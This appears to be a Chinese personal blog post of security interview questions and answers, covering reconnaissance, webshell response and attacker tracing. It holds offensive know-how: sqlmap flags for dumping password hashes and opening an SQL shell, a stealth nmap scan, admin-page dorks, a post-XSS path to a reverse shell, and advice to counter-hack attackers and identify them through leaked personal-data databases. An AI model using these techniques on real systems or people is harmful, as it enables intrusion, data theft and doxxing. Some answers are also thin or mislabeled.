<p>非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合，可以是文档或者键值对等。</p>
<p>比如</p>
<p><strong>Redis</strong>		<strong>键值数据库</strong></p>
<p><strong>MongoDB</strong>		<strong>文档数据库</strong></p>
<p><strong>HBase</strong>       <strong>列存储数据库</strong></p>
<p><strong>Neo4J</strong> 	 <strong>（非关系型数据库----图形数据库）</strong></p>
<p>数据库模型：对象模型、层次模型（轻量级数据访问协议）、网状模型（大型数据储存）、关系模型、面向对象模型、半结构化模型、平面模型（表格模型，一般在形式上是一个二维数组。如表格模型数据Excel)</p>
<h2 id="sqlmap怎么看当前用户权限">sqlmap怎么看当前用户权限</h2>
<pre><code>Enumeration:

-a, --all 查找全部，很暴力。直接用-a
-b, --banner 查找数据库管理系统的标识。直接用-b
--current-user 当前用户，常用，直接用--current-user
--current-db 当前数据库，常用，直接用--current-db
--hostname 主机名，直接用--hostname
--is-dba
--users 查询一共都有哪些用户，常用，直接用--users
--passwords 查询用户密码的哈希，常用，直接用--passwords
--privileges 查看特权，常用。例： --privileges -U username (CU 就是当前用户)
--roles 查看一共有哪些角色（权限），直接用--roles
--dbs 目标服务器中有什么数据库，常用，直接用--dbs
--tables 目标数据库有什么表，常用，直接用--tables
--columns 目标表中有什么列，常用，直接用--colums
--schema 目标数据库数据库系统管理模式。
--count 查询结果返回一个数字，即多少个。
--dump 查询指定范围的全部数据。例： --dump -D admin -T admin -C username
--dump-all 查询全部数据。例： --dump-all --exclude-sysdbs
--search 搜索列、表和/或数据库名称。
--comments 检索数据库的备注。
-D DB 指定从某个数据库查询数据，常用。例： -D admindb
-T TBL 指定从某个表查询数据，常用。例： -T admintable
-C COL 指定从某个列查询数据，常用。例： -C username
-X EXCLUDE 指定数据库的标识符。
-U USER 一个用户，通常和其他连用。例： --privileges -U username (CU 就是当前用户)
--exclude-sysdbs 除了系统数据库。
--pivot-column=P.. 枢轴列名，不懂。
--where=DUMPWHERE 在dump表时使用where限制条件。
--start=LIMITSTART 设置一个起始，通常和--dunmp连用。
--stop=LIMITSTOP 同上，设置一个结束。
--first=FIRSTCHAR 以第一个查询输出的字符检索，不懂。
--last=LASTCHAR 以最后一个查询输出的字符检索，不懂+2。
--sql-query=QUERY 执行一个sql语句。
--sql-shell 创建一个sql的shell。
--sql-file=SQLFILE 执行一个给定文件中的sql语句
</code></pre>
<h2 id="nmap怎么隐藏ip扫描">nmap怎么隐藏ip扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sN;-sF;-sX 【目标】 隐蔽扫描</span><br></pre></td></tr></table></figure>
<h2 id="挖过SRC吗">挖过SRC吗?</h2>
<p>没有,寄</p>
<h2 id="边缘资产如何探测">边缘资产如何探测</h2>
<p>从主域名出发,我们首先需要考虑的是子域名,<a target="_blank" rel="noopener" href="http://xn--xxx-4l3e.com">即xxx.com</a>,</p>
<h3 id="子域名收集">子域名收集</h3>
<h4 id="搜索引擎查询">搜索引擎查询</h4>
<p>谷歌黑暗搜索:</p>
<blockquote>
<p>- site:domain.com filetype:xls|doc|pdf</p>
<p>- site:domain.com inurl:admin|login|manage</p>
<p>- site:domain.com intitle:管理|后台|登录</p>
<p>- site:domain.com intext:登录|后台、管理|error|debug</p>
<p>inturl:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网络空间安全搜索引擎</span><br><span class="line">zoomeye(钟馗之眼)：https://www.zoomeye.org</span><br><span class="line">shodan：https://www.shodan.io</span><br><span class="line">Fofa：https://fofa.so</span><br><span class="line"> </span><br><span class="line">PS：可编写Python脚本批量查询、获取</span><br></pre></td></tr></table></figure>
<h4 id="在线查询接口">在线查询接口</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://tool.chinaz.com/subdomain/</span><br><span class="line">http://i.links.cn/subdomain/    </span><br><span class="line">http://subdomain.chaxun.la/</span><br><span class="line">http://searchdns.netcraft.com/</span><br><span class="line">https://www.virustotal.com/</span><br><span class="line">https://censys.io/</span><br><span class="line">https://x.threatbook.cn/ 微步在线</span><br></pre></td></tr></table></figure>
<h4 id="子域名暴力猜解">子域名暴力猜解</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆破工具：</span><br><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https://github.com/ring04h/wydomain    </span><br><span class="line">subDomainsBrute:https://github.com/lijiejie/</span><br><span class="line">Sublist3r:https://github.com/aboul3la/Sublist3r</span><br></pre></td></tr></table></figure>
<h4 id="DNS查询-枚举">DNS查询/枚举</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DNS查询：</span><br><span class="line">host -t a domainName</span><br><span class="line">host -t mx domainName</span><br><span class="line"> </span><br><span class="line">优点：非常直观，通过查询DNS服务器的A记录、CNAME等，可以准确得到相关信息，较全。</span><br><span class="line">缺点：有很大的局限性，很多DNS是禁止查询的。</span><br><span class="line">参考：https://www.cnblogs.com/xuanhun/p/3489038.html</span><br><span class="line"> </span><br><span class="line">域传送漏洞</span><br><span class="line"> </span><br><span class="line">DNS暴力破解：fierce</span><br><span class="line">参考链接：http://blog.csdn.net/jeanphorn/article/details/44987549</span><br><span class="line"> </span><br><span class="line">Passive DNS</span><br><span class="line">参考链接：http://www.freebuf.com/articles/network/103815.html</span><br></pre></td></tr></table></figure>
<h4 id="HTTPS证书">HTTPS证书</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中。SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</span><br><span class="line"> </span><br><span class="line">SSL证书搜索引擎：</span><br><span class="line">https://certdb.com/domain/github.com</span><br><span class="line">https://crt.sh/?Identity=%%.github.com</span><br><span class="line">https://censys.io/</span><br><span class="line"> </span><br><span class="line">基于 HTTPS 证书的子域名收集小程序 ：GetDomainsBySSL.py</span><br><span class="line">参考链接：http://www.freebuf.com/articles/network/140738.html</span><br></pre></td></tr></table></figure>
<h4 id="综合搜索">综合搜索</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">提莫：https://github.com/bit4woo/teemo </span><br><span class="line">主要有三大模块：搜索引擎 第三方站点 枚举 </span><br><span class="line"> </span><br><span class="line">利用全网IP扫描http端口 在访问IP的80或者8080端口的时候，可能会遇到配置了301跳转的，可以在header里获取域名信息。</span><br><span class="line">全网扫描结果如下：https://scans.io/study/sonar.http</span><br></pre></td></tr></table></figure>
<h4 id="子域名筛选">子域名筛选</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当收集的子域名数量过大，手动筛选工作量太大，如何快速扫描，半自动的筛选出有效的可能存在漏洞的子域名。</span><br><span class="line">参考链接：http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/3413.html</span><br></pre></td></tr></table></figure>
<h4 id="相关域名收集">相关域名收集</h4>
<h5 id="旁站及c段收集">旁站及c段收集</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">同IP网站及C段查询</span><br><span class="line">IP反查域名</span><br><span class="line"> </span><br><span class="line">工具：御剑、K8现在还是dirmap好用</span><br><span class="line">在线查询工具：</span><br><span class="line">http://www.hackmall.cn/</span><br><span class="line">http://www.webscan.cc/  推荐</span><br><span class="line">https://phpinfo.me/bing.php </span><br><span class="line"> </span><br><span class="line">将C段收集的相关IP，推测该单位所在的IP段，再针对IP段进行服务器端口扫描</span><br></pre></td></tr></table></figure>
<h5 id="端口扫描">端口扫描</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对1-65535端口扫描，探测Web服务端口</span><br></pre></td></tr></table></figure>
<h5 id="主站提取">主站提取</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过编写爬虫,从主站页面(一般在主页)获取相关业务系统</span><br><span class="line"></span><br><span class="line">跨域策略文件 crossdomain.xml</span><br><span class="line">如：https://www.baidu.com/crossdomain.xml</span><br></pre></td></tr></table></figure>
<h5 id="移动端">移动端</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">随着移动端的兴起，很多单位都有自己的移动APP、微信公众号、支付宝生活号等，这也是值得重点关注的点。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="行业系统">行业系统</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同行业可能存在类似的系统，甚至于采用同一家厂商的系统，可互做对比</span><br><span class="line">通用：办公OA、邮件系统、VPN等</span><br><span class="line">医院：门户、预约系统、掌上医院、微信公众平台等</span><br></pre></td></tr></table></figure>
<h2 id="thinkphp-框架各种版本有什么漏洞">thinkphp 框架各种版本有什么漏洞</h2>
<p>5.0.0.4远程代码执行</p>
<h2 id="排查出来一句话木马-没有日志怎么找">排查出来一句话木马,没有日志怎么找</h2>
<h3 id="检查网站目录">检查网站目录</h3>
<p>看是否有可疑的代码或者文件名。</p>
<h3 id="利用PHP的-功能">利用PHP的 功能</h3>
<ul>
<li>
<p>利用PHP的 disable_functions 功能,禁用一些常用的执行命令的函数，如 eval , assert , system , exec 等。</p>
</li>
<li>
<p>利用PHP的 safe_mode 功能，开启安全模式，限制PHP脚本的权限和功能。</p>
</li>
<li>
<p>利用WAF或者IDS等安全设备或软件，对一句话木马的特征进行检测和拦截。</p>
</li>
<li>
<p>利用文件监控或者日志分析等手段，及时发现和处理异常的文件或者请求。</p>
</li>
</ul>
<h3 id="检查网络流量">检查网络流量</h3>
<p>使用网络监控工具分析网络流量，以检测与已知恶意主机或IP地址之间的通信。这可能会暴露任何存在的后门或远程控制连接。</p>
<h2 id="别人已经将木马传到主机时-怎么排查">别人已经将木马传到主机时,怎么排查</h2>
<p>同系统排查,进程,启动项,服务,网络连接端口检查,任务计划排查,用户信息检查</p>
<h2 id="如何溯源">如何溯源</h2>
<h3 id="答案一">答案一:</h3>
<p><code>判断Webshell事件发生时间</code>：根据异常现象发生时间，结合网站目录中Webshell文件的创建时间，可大致定位事件发生的时间段。以便后续依据此时间进行溯源分析、追踪攻击者的活动路径。</p>
<p><code>对攻击路径进行溯源分析</code>：如果网站被植入暗链或出现单击链接跳转到其他网站(如博彩网站、色情网站等)的情况，应首先排查网站首页相关js，查看是否被植入了恶意跳转的js。<br>
若网站首页被篡改或有其他被攻击的现象，可以根据网站程序信息，如程序目录、文件上传目录、war包部署目录，使用工具(如D盾)和搜索关键词(如eval、 base64_ decode、assert)方式，定位到Webshell文件并清除。然后根据日志进行溯源分析，同时除了进行Web应用层排查，还应对系统层进行全面排查，防止攻击者在获取Webshel后执行了其他的权限维持操作。</p>
<p><code>判断系统架构</code>：收集系统信息，为快速溯源分析提供前期准备工作</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>服务器</td>
<td>Windows、Linux等</td>
</tr>
<tr>
<td>内容管理系统(CMS)</td>
<td>Jeecms、Wordpress、 Drupal、 TRS WCM、Phpcms、 Dedecms 等</td>
</tr>
<tr>
<td>中间件</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 JBoss、 Websphere、 Jetty 等</td>
</tr>
<tr>
<td>框架</td>
<td>Struts2、Thinkphp、 Spring、 Shiro、 Fastjson 等</td>
</tr>
<tr>
<td>数据库</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 Struts、 MySQL等</td>
</tr>
<tr>
<td>脚本语言</td>
<td>ASP、PHP、JSP 等</td>
</tr>
<tr>
<td>业务架构</td>
<td>如前端网页内容是否是后端通过FTP上传的(新闻网偏多)等</td>
</tr>
</tbody>
</table>
<h3 id="答案二">答案二</h3>
<h4 id="针对-ip-溯源一二">针对 ip 溯源一二</h4>
<p>一般来说，红队大部分都是使用代理节点进行测试，假如我们捕获或者从样本里面分析拿到了真实的 ip, 那么以下的操作场景就有用了，或者使用钓鱼反调的方式去获取到真实的 ip</p>
<h4 id="来自创宇盾等节点的流量-ip">来自创宇盾等节点的流量 ip</h4>
<p>ip, 假设前面还有一层云 waf cdn 厂商等。那么需要协调到提供服务的厂商，快速获取到云 waf 或者 cdn 之前的节点真实 ip. 然后拿到了真实的 ip, 就变成了一些常规的溯源操作</p>
<h4 id="whois-域名反查">whois 域名反查</h4>
<p>ip, 初步可以进行 whois 查询，以及域名反查，查看历史的解析，以及历史的 ip 用有记录，运气好的话，假如攻击队队员使用的是自己的博客之类的 vps 常用节点，那么很有可能通过这个手法进行溯源到相关人员</p>
<h4 id="探测端口-服务-进行反渗透">探测端口 服务 进行反渗透</h4>
<p>ip, 对该 ip 进行端口探测，服务探测，进行反渗透，一般来说红队的 vps 都是在一些国内的一些 vps 主机供应商或者云服务供应商那边购买，假如是国内的话，可以通过公安网警来进行协助查水表，获取真实人员的身份。假如我们反渗透成功，那么可以提取历史登入记录，历史 ip, 网络连接，进程 以及攻击工具 进程 内存镜像等方式进行取证分析.</p>
<h4 id="威胁情报">威胁情报</h4>
<p>ip, 对使用威胁情报进行综合分析，查看该 ip 他人对该 ip 打的标签，历史解析记录，历史变更记录，以及该 ip 上面关联的相关样本，这些都能够获取到进行进一步分析.</p>
<h4 id="邮箱-qq-手机号-社工库">邮箱 qq 手机号 社工库</h4>
<p>通过 ip 的 whois 获取到了相关人员的 qq 或者邮箱或者手机号，那么可以使用社工库，进行社工查询。比如 twitter 的社工库机器人或者自行研究的社工库进行综合关联分析</p>
<h4 id="qq-微信-抖音-陌陌-等接口">qq 微信 抖音 陌陌 等接口</h4>
<p>获取到了手机号，那么可以通过 qq 微信 抖音 陌陌 等接口进行关联，一般获取到了手机号初步可以通过这种简单易行的手法去溯源到红队人员</p>
<h4 id="ga-数据-运营商数据">ga 数据 运营商数据</h4>
<p>有办法能通过 ga 资源，或者直接通过运营商拿数据，那就更好了</p>
<h3 id="答案三">答案三</h3>
<h2 id="ida如何渗透小程序">ida如何渗透小程序</h2>
<p>使用ida,jeb逆向分析一下</p>
<h2 id="MySQL得到管理员权限后如何扩大战果">MySQL得到管理员权限后如何扩大战果</h2>
<p>看看能不能进入后台,有些后台有文件上传,然后getshell加上烂土豆提权</p>
<h2 id="网络空间搜索引擎用过吗">网络空间搜索引擎用过吗</h2>
<h3 id="FOFA">FOFA</h3>
<p>官网：<a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a></p>
<p>FOFA是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等.</p>
<table>
<thead>
<tr>
<th>逻辑连接符</th>
<th>具体含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>匹配，=&quot;&quot;时，可查询不存在字段或者值为空的情况。</td>
</tr>
<tr>
<td>==</td>
<td>完全匹配，==&quot;&quot;时，可查询存在且值为空的情况。</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>与</td>
</tr>
<tr>
<td>||</td>
<td>或者</td>
</tr>
<tr>
<td>!=</td>
<td>不匹配，!=&quot;&quot;时，可查询值为空的情况。</td>
</tr>
<tr>
<td>*=</td>
<td>模糊匹配，使用<em>或者?进行搜索，比如banner</em>=“mys??” (个人版及以上可用)。</td>
</tr>
<tr>
<td>()</td>
<td>确认查询优先级，括号内容优先级最高。</td>
</tr>
</tbody>
</table>
<h3 id="360Quake">360Quake</h3>
<p>360 网络空间测绘系统（QUAKE) 是 360 网络安全响应中心（360-CERT）自主设计研发的全球网络空间测绘系统，能够对全球 IPv4、IPv6 地址进行持续性探测，实时感知全球网络空间中各类资产并发现其安全风险。</p>
<p>官网：<a target="_blank" rel="noopener" href="https://quake.360.cn/">https://quake.360.cn</a></p>
<h3 id="Shodan">Shodan</h3>
<p>shodan是国外的一款网络空间搜索引擎，凡是连接到互联网的红绿灯、安全摄像头等设备，都可以被轻易查询到。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hostname:“www.baidu.com” 主机名/域名</span><br><span class="line">port:“23” 端口</span><br><span class="line">net:“192.168.1.0/24” CIDR格式的IP地址</span><br><span class="line">city:“guang zhou” 城市</span><br><span class="line">product:“Apache httpd” 产品类型</span><br><span class="line">version:“2.6.1” 中间件</span><br><span class="line">os:“windows” 操作系统</span><br><span class="line">asn:“AS9500” 自治系统号（大网络的情况）</span><br><span class="line">country:“CN” 国家</span><br><span class="line">org:“google” 组织</span><br><span class="line">isp:“China Telecom” 运营商</span><br><span class="line">geo:“38.4681,106.2731” 经纬度</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Zoomeye">Zoomeye</h3>
<p>ZoomEye是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其运用的效劳或组件等信息。 ZoomEye 拥有两大探测引擎：Xmap 和 Wmap，辨别针对网络空间中的设备及网站，经过 24 小时不连续的探测、辨认，标识出互联网设备及网站所运用的效劳及组件。研讨人员可以经过 ZoomEye 方便的理解组件的普及率及破绽的危害范围等信息。</p>
<p>官网：<a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<p><strong>常用的端口漏洞</strong></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/724f714900ab4499be971a2144354518.png" alt="在这里插入图片描述"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/58ea9afa6d554f6394178647df10d54a.png" alt="在这里插入图片描述"></p>
<h2 id="怎么用渗透工具配合xss攻击获取服务器权限">怎么用渗透工具配合xss攻击获取服务器权限</h2>
<p>获取到管理员的一些信息</p>
<p>访问之后通过chrome上的EditThisCookie插件替换cookie成功以管理员的身份进入后台</p>
<p>利用<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8aa9474a148c">浏览器的同源策略</a></p>
<p>同源的定义：如果两个页面的协议，端口和主机都相同，则两个页面具有相同的源。Cookie：只有同源的网页才能共享，但是若两个页面一级域名相同，只是二级域名不同，那么浏览器可以通过设置document.domain来共享Cookie。</p>
<p>通过同源策略，我们成功的进入了管理员的后台。<br>
进入后台第一件事：找上传点！</p>
<p>看看自己是什么权限</p>
<p>试一下能不能弹shell到msf</p>
<p>看看有没有域环境,尝试横向渗透</p>
<h2 id="流量检测设备和态势感知设备发生报警，对警告进行分析，讲一下你流量分析和上机排查的思路">流量检测设备和态势感知设备发生报警，对警告进行分析，讲一下你流量分析和上机排查的思路</h2>
<h3 id="排查一下是否是误报">排查一下是否是误报</h3>
<p>先判断是否是恶意攻击行为</p>
<p>如果判断不了或者判断是真正的攻击行为立即上报</p>
<h3 id="排查主机上面是否有其他的告警情况">排查主机上面是否有其他的告警情况</h3>
<p>如果存在首先隔绝该主机与其他主机的联系,可能的话关闭主机服务</p>
<h3 id="上机排查">上机排查</h3>
<p>首先排查服务日志情况,查看通过什么方式修补漏洞</p>
<p>其次查看主机操作日志 是否有其他横向渗透,或者权限维持手段</p>
<h2 id="ip代理如何排查">ip代理如何排查</h2>
<p>具体来说 看 X-Forwarded-For 请求头</p>
<p><strong>面试官问的时候是这样问的:</strong><br>
如果对方一分钟换一个IP怎么办</p>
<p>红队的ip不可能是无限的 可以寻找 一段时间内的规律进行统一封禁</p>
<p>或者根据攻击方的流量特征来进行封禁</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io">Jinmu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io/%E9%9D%A2%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%98/">https://jinmu1108.github.io/%E9%9D%A2%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jinmu1108.github.io" target="_blank">J1Nmu</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E9%9D%A2%E8%AF%95/">面试</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E9%9D%A2%E8%AF%95/%E8%93%9D%E9%98%9F%E4%B8%AD%E7%BA%A7%E9%9D%A2%E8%AF%95%E9%A2%98/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">蓝队初级面试</div></div></a></div><div class="next-post pull-right"><a href="/Crypto%E9%A2%98%E7%9B%AE/BUU-crypto/BUU-Crypto/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUU-Crypto</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E9%9D%A2%E8%AF%95/%E8%93%9D%E9%98%9F%E4%B8%AD%E7%BA%A7%E9%9D%A2%E8%AF%95%E9%A2%98/" title="蓝队初级面试"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">蓝队初级面试</div></div></a></div><div><a href="/Crypto/RC4/Crypto-RC4/" title="Crypto-RC4"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-18</div><div class="title">Crypto-RC4</div></div></a></div><div><a href="/Crypto/%E7%90%86%E8%AE%BA/Crypto%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/" title="Crypto理论知识"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-31</div><div class="title">Crypto理论知识</div></div></a></div><div><a href="/Crypto/RSA/Crypto-RSA/" title=""><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-19</div><div class="title"></div></div></a></div><div><a href="/Crypto/AES/Crypto-AES/" title="Crypto-AES"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-19</div><div class="title">Crypto-AES</div></div></a></div><div><a href="/Crypto/Crypto/" title="Crypto"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-05</div><div class="title">Crypto</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jinmu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jinmu1108"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">hvv中级面试题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E8%BF%87%E5%93%AA%E4%BA%9B%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-number">1.1.</span> <span class="toc-text">用过哪些安全设备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">渗透测试流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">Webshell应急响应流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E8%A2%AB%E6%A4%8D%E5%85%A5webshell"><span class="toc-number">1.3.1.</span> <span class="toc-text">判断是否被植入webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E5%A4%84%E7%90%86"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">临时处理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E6%9F%A5%E6%9D%80"><span class="toc-number">1.3.2.</span> <span class="toc-text">webshell查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Windows系统排查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.2.2.</span> <span 